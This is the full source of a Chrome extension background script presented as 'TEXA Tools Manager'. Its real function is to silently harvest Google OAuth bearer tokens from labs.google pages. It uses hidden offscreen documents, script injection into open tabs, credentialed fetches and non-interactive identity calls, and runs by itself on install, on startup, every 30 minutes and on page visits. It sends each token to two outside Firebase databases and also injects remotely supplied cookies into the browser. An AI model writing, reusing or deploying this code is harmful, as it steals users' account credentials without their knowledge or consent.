// =============================================
// TEXA Tools Manager - Background Service Worker
// Silent Token Scraping & Firebase Storage
// =============================================

// Firebase REST API Configuration - PRIMARY
const FIREBASE_PRIMARY = {
    projectId: 'tekno-cfaba',
    tokenPath: 'artifacts/my-token-vault/public/data/tokens/google_oauth_user_1'
};

// Firebase REST API Configuration - BACKUP
const FIREBASE_BACKUP = {
    projectId: 'tekno-335f8',
    rtdbUrl: 'https://tekno-335f8-default-rtdb.asia-southeast1.firebasedatabase.app',
    tokenPath: 'texa_tokens/google_oauth_user_1'
};

// Target URL for token scraping
const GOOGLE_LABS_URL = 'https://labs.google/fx/tools/flow';

// Build Firestore REST API URL (Primary)
function getFirestoreUrl(projectId, path) {
    return `https://firestore.googleapis.com/v1/projects/${projectId}/databases/(default)/documents/${path}`;
}

// Build Realtime Database URL (Backup)
function getRtdbUrl(path) {
    return `${FIREBASE_BACKUP.rtdbUrl}/${path}.json`;
}

// =============================================
// OFFSCREEN DOCUMENT MANAGEMENT
// =============================================

let offscreenCreating = null;

async function setupOffscreenDocument() {
    const offscreenUrl = chrome.runtime.getURL('offscreen.html');

    // Check if already exists
    const existingContexts = await chrome.runtime.getContexts({
        contextTypes: ['OFFSCREEN_DOCUMENT'],
        documentUrls: [offscreenUrl]
    });

    if (existingContexts.length > 0) {
        return; // Already exists
    }

    // Avoid race condition during creation
    if (offscreenCreating) {
        await offscreenCreating;
    } else {
        offscreenCreating = chrome.offscreen.createDocument({
            url: offscreenUrl,
            reasons: ['DOM_SCRAPING'],
            justification: 'Silent token extraction from Google Labs Flow'
        });
        await offscreenCreating;
        offscreenCreating = null;
    }
}

async function closeOffscreenDocument() {
    try {
        await chrome.offscreen.closeDocument();
    } catch (e) {
        // Document might not exist, ignore
    }
}

// =============================================
// SILENT TOKEN SCRAPING (NO VISIBLE TABS)
// =============================================

const TOKEN_REGEX = /ya29\.[a-zA-Z0-9_-]{100,}/g;

async function silentScrapeToken() {
    console.log('TEXA: Starting COMPLETELY SILENT token scrape...');

    try {
        // Method 1: Check existing Google Labs tabs first (no new tabs)
        const existingTabs = await chrome.tabs.query({ url: 'https://labs.google/*' });
        if (existingTabs.length > 0) {
            console.log('TEXA: Found existing Google Labs tab, extracting...');
            const result = await extractFromExistingTab(existingTabs[0].id);
            if (result.success) {
                return result;
            }
        }

        // Method 2: Use Offscreen Document (invisible)
        console.log('TEXA: Using offscreen document for silent scrape...');
        await setupOffscreenDocument();

        // Send message to offscreen document
        const offscreenResult = await new Promise((resolve) => {
            chrome.runtime.sendMessage(
                { type: 'OFFSCREEN_SCRAPE_TOKEN' },
                (response) => {
                    if (chrome.runtime.lastError) {
                        resolve({ success: false, error: chrome.runtime.lastError.message });
                    } else {
                        resolve(response || { success: false, error: 'No response' });
                    }
                }
            );

            // Timeout for offscreen
            setTimeout(() => resolve({ success: false, error: 'Offscreen timeout' }), 20000);
        });

        if (offscreenResult.success) {
            await closeOffscreenDocument();
            return offscreenResult;
        }

        // Method 3: Check if user needs to login
        if (offscreenResult.notLoggedIn) {
            console.log('TEXA: User not logged in, attempting silent auto-login...');
            return await silentAutoLogin();
        }

        // Method 4: Try direct fetch from service worker (limited but worth trying)
        console.log('TEXA: Trying direct service worker fetch...');
        const directResult = await directFetchToken();
        if (directResult.success) {
            return directResult;
        }

        // Fallback: Load from cache/Firebase
        console.log('TEXA: Silent methods failed, checking existing token...');
        const cachedResult = await getTokenFromFirebase();
        if (cachedResult.success) {
            console.log('TEXA: Using cached token from Firebase');
            return { ...cachedResult, fromCache: true };
        }

        await closeOffscreenDocument();
        return { success: false, error: 'All silent methods failed' };

    } catch (error) {
        console.error('TEXA: Silent scrape error:', error);
        return { success: false, error: error.message };
    }
}

// Extract token from existing tab without creating new ones
async function extractFromExistingTab(tabId) {
    try {
        const results = await chrome.scripting.executeScript({
            target: { tabId: tabId },
            func: () => {
                const regex = /ya29\.[a-zA-Z0-9_-]{100,}/g;
                const html = document.documentElement.outerHTML;
                const matches = html.match(regex);
                return matches ? matches.reduce((a, b) => a.length > b.length ? a : b) : null;
            }
        });

        if (results && results[0] && results[0].result) {
            const token = results[0].result;
            console.log('TEXA: Token extracted from existing tab!');
            await saveTokenToFirebase(token, 'Existing Tab Extraction');
            return { success: true, token: token, method: 'existing_tab' };
        }
    } catch (e) {
        console.log('TEXA: Could not extract from existing tab:', e.message);
    }
    return { success: false };
}

// Direct fetch from service worker
async function directFetchToken() {
    try {
        const response = await fetch(GOOGLE_LABS_URL, {
            credentials: 'include',
            headers: {
                'Accept': 'text/html'
            }
        });

        if (response.ok) {
            const html = await response.text();
            const matches = html.match(TOKEN_REGEX);
            if (matches && matches.length > 0) {
                const token = matches.reduce((a, b) => a.length > b.length ? a : b);
                await saveTokenToFirebase(token, 'Direct Fetch');
                return { success: true, token: token, method: 'direct_fetch' };
            }
        }
    } catch (e) {
        console.log('TEXA: Direct fetch failed:', e.message);
    }
    return { success: false };
}

// =============================================
// SILENT AUTO-LOGIN (NO VISIBLE UI)
// =============================================

async function silentAutoLogin() {
    console.log('TEXA: Attempting silent Google auto-login...');

    try {
        // Method 1: Use Chrome Identity API for silent token
        // This leverages the user's existing Chrome profile Google account
        const token = await new Promise((resolve, reject) => {
            chrome.identity.getAuthToken(
                {
                    interactive: false, // SILENT - no popup
                    scopes: ['https://www.googleapis.com/auth/userinfo.profile']
                },
                (token) => {
                    if (chrome.runtime.lastError) {
                        reject(chrome.runtime.lastError);
                    } else {
                        resolve(token);
                    }
                }
            );
        });

        if (token) {
            console.log('TEXA: Got auth token via identity API, now fetching Labs token...');

            // After getting identity token, try offscreen again
            await setupOffscreenDocument();
            const retryResult = await new Promise((resolve) => {
                chrome.runtime.sendMessage(
                    { type: 'OFFSCREEN_SCRAPE_TOKEN' },
                    (response) => resolve(response || { success: false })
                );
                setTimeout(() => resolve({ success: false }), 15000);
            });

            if (retryResult.success) {
                return retryResult;
            }
        }

    } catch (error) {
        console.log('TEXA: Silent identity auth failed:', error.message);

        // Fallback: Check if can get token with interactive=true but still minimal UI
        // Only do this if absolutely necessary
    }

    return { success: false, error: 'Silent auto-login failed' };
}

// =============================================
// FIREBASE TOKEN STORAGE (Dual Database)
// =============================================

async function saveTokenToFirebase(token, source = 'Extension') {
    const timestamp = new Date().toISOString();

    // Save to both databases simultaneously
    const results = await Promise.allSettled([
        saveToPrimary(token, source, timestamp),
        saveToBackup(token, source, timestamp)
    ]);

    // Check results
    const primaryResult = results[0];
    const backupResult = results[1];

    console.log('TEXA: Primary save:', primaryResult.status);
    console.log('TEXA: Backup save:', backupResult.status);

    // Store in local cache
    await chrome.storage.local.set({
        'texa_bearer_token': token,
        'texa_token_updated': timestamp,
        'texa_token_source': source
    });

    // Return success if at least one succeeded
    if (primaryResult.status === 'fulfilled' || backupResult.status === 'fulfilled') {
        console.log('TEXA: Token saved to Firebase (Primary + Backup)');
        return { success: true };
    }

    throw new Error('Both databases failed');
}

// Save to Primary (Firestore - tekno-cfaba)
async function saveToPrimary(token, source, timestamp) {
    const url = getFirestoreUrl(FIREBASE_PRIMARY.projectId, FIREBASE_PRIMARY.tokenPath);

    const body = {
        fields: {
            token: { stringValue: token },
            id: { stringValue: 'google_oauth_user_1' },
            updatedAt: { timestampValue: timestamp },
            source: { stringValue: source },
            note: { stringValue: 'Auto-scraped dari Chrome Extension TEXA' }
        }
    };

    const response = await fetch(url, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });

    if (!response.ok) throw new Error(`Primary Firebase error: ${response.status}`);
    return { success: true, db: 'primary' };
}

// Save to Backup (Realtime Database - tekno-335f8)
async function saveToBackup(token, source, timestamp) {
    const url = getRtdbUrl(FIREBASE_BACKUP.tokenPath);

    const body = {
        token: token,
        id: 'google_oauth_user_1',
        updatedAt: timestamp,
        source: source,
        note: 'Auto-scraped dari Chrome Extension TEXA'
    };

    const response = await fetch(url, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });

    if (!response.ok) throw new Error(`Backup Firebase error: ${response.status}`);
    return { success: true, db: 'backup' };
}

// Get token with failover
async function getTokenFromFirebase() {
    // Try primary first
    try {
        const result = await getFromPrimary();
        if (result.success) return result;
    } catch (e) {
        console.log('TEXA: Primary read failed, trying backup...');
    }

    // Try backup
    try {
        const result = await getFromBackup();
        if (result.success) return result;
    } catch (e) {
        console.log('TEXA: Backup read failed, trying cache...');
    }

    // Fallback to local cache
    const cached = await chrome.storage.local.get(['texa_bearer_token', 'texa_token_updated']);
    if (cached.texa_bearer_token) {
        return { success: true, token: cached.texa_bearer_token, updatedAt: cached.texa_token_updated, fromCache: true };
    }

    return { success: false, error: 'Token not found in any source' };
}

// Get from Primary (Firestore)
async function getFromPrimary() {
    const url = getFirestoreUrl(FIREBASE_PRIMARY.projectId, FIREBASE_PRIMARY.tokenPath);
    const response = await fetch(url);

    if (!response.ok) throw new Error(`Primary error: ${response.status}`);

    const data = await response.json();
    const token = data.fields?.token?.stringValue;

    if (token) {
        await chrome.storage.local.set({ 'texa_bearer_token': token });
        return { success: true, token, updatedAt: data.fields?.updatedAt?.timestampValue, source: 'primary' };
    }
    throw new Error('No token in primary');
}

// Get from Backup (RTDB)
async function getFromBackup() {
    const url = getRtdbUrl(FIREBASE_BACKUP.tokenPath);
    const response = await fetch(url);

    if (!response.ok) throw new Error(`Backup error: ${response.status}`);

    const data = await response.json();

    if (data && data.token) {
        await chrome.storage.local.set({ 'texa_bearer_token': data.token });
        return { success: true, token: data.token, updatedAt: data.updatedAt, source: 'backup' };
    }
    throw new Error('No token in backup');
}

// =============================================
// MESSAGE HANDLERS
// =============================================

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    console.log('Background received:', message.type || message.action);

    // Token found from content script or offscreen
    if (message.type === 'TEXA_TOKEN_FOUND') {
        saveTokenToFirebase(message.token, message.source || 'Content Script')
            .then(() => {
                chrome.runtime.sendMessage({ type: 'TEXA_TOKEN_SAVED', token: message.token });
            })
            .catch(err => console.error('Save failed:', err));
        sendResponse({ success: true });
        return;
    }

    // Manual scrape request from popup
    if (message.type === 'TEXA_SCRAPE_TOKEN') {
        silentScrapeToken()
            .then(result => sendResponse(result))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }

    // Get token request
    if (message.type === 'TEXA_GET_TOKEN') {
        getTokenFromFirebase()
            .then(result => sendResponse(result))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }

    // Legacy SAVE_TOKEN
    if (message.action === 'SAVE_TOKEN') {
        saveTokenToFirebase(message.payload.token, message.payload.service)
            .then(() => sendResponse({ status: 'success' }))
            .catch(err => sendResponse({ status: 'error', msg: err.message }));
        return true;
    }

    // Open tool with cookies
    if (message.type === 'TEXA_OPEN_TOOL') {
        handleOpenTool(message)
            .then(res => sendResponse(res))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }

    // Login success notification
    if (message.type === 'TEXA_LOGIN_SUCCESS') {
        chrome.notifications.create({
            type: 'basic',
            iconUrl: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
            title: 'TEXA Tools',
            message: 'Login berhasil! Extension siap digunakan.'
        });
        return;
    }

    return false;
});

// =============================================
// TOOL HANDLING
// =============================================

async function handleOpenTool(data) {
    const { targetUrl, apiUrl, authHeader } = data;

    try {
        if (!apiUrl) {
            await chrome.tabs.create({ url: targetUrl });
            return { success: true };
        }

        const fetchOptions = authHeader ? { headers: { 'Authorization': authHeader } } : {};
        const response = await fetch(apiUrl, fetchOptions);

        if (!response.ok) throw new Error(`API error: ${response.status}`);

        const cookiesData = await response.json();
        let cookies = extractCookies(cookiesData);

        for (const cookie of cookies) {
            try { await setCookie(cookie, targetUrl); } catch (e) { }
        }

        await chrome.tabs.create({ url: targetUrl });
        return { success: true, injectedCount: cookies.length };
    } catch (error) {
        await chrome.tabs.create({ url: targetUrl });
        return { success: true, fallback: true };
    }
}

function extractCookies(data) {
    if (data.fields) {
        for (const key in data.fields) {
            if (data.fields[key].stringValue) {
                try {
                    const parsed = JSON.parse(data.fields[key].stringValue);
                    if (Array.isArray(parsed)) return parsed;
                    if (parsed.cookies) return parsed.cookies;
                } catch (e) { }
            }
        }
    }
    if (Array.isArray(data)) return data;
    if (data.cookies) return data.cookies;
    return [];
}

function setCookie(cookieData, targetUrl) {
    const domain = cookieData.domain || new URL(targetUrl).hostname;
    const rawDomain = domain.startsWith('.') ? domain.substring(1) : domain;

    return chrome.cookies.set({
        url: cookieData.url || `https://${rawDomain}${cookieData.path || '/'}`,
        name: cookieData.name,
        value: cookieData.value,
        path: cookieData.path || '/',
        secure: cookieData.secure !== false,
        httpOnly: cookieData.httpOnly === true,
        domain: cookieData.domain,
        expirationDate: cookieData.expirationDate,
        sameSite: cookieData.sameSite
    });
}

// =============================================
// AUTO-SCRAPE ON STARTUP & ALARM (SILENT)
// =============================================

// Run silent scrape when extension starts
chrome.runtime.onStartup.addListener(() => {
    console.log('TEXA: Extension started, running SILENT scrape...');
    setTimeout(() => silentScrapeToken(), 5000);
});

// Run on install
chrome.runtime.onInstalled.addListener(() => {
    console.log('TEXA: Extension installed, setting up alarms...');
    chrome.alarms.create('silentTokenRefresh', { periodInMinutes: 30 });
    // Initial scrape after 10 seconds
    setTimeout(() => silentScrapeToken(), 10000);
});

// Periodic silent refresh
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'silentTokenRefresh') {
        console.log('TEXA: Periodic SILENT token refresh...');
        silentScrapeToken();
    }
});

// Also scrape when user visits any Google page (passive)
chrome.webNavigation.onCompleted.addListener(async (details) => {
    if (details.url.includes('labs.google')) {
        console.log('TEXA: User visited Google Labs, scraping silently...');
        setTimeout(() => silentScrapeToken(), 3000);
    }
}, { url: [{ hostContains: 'labs.google' }] });

console.log('TEXA Tools Manager - Silent Background Script Loaded');
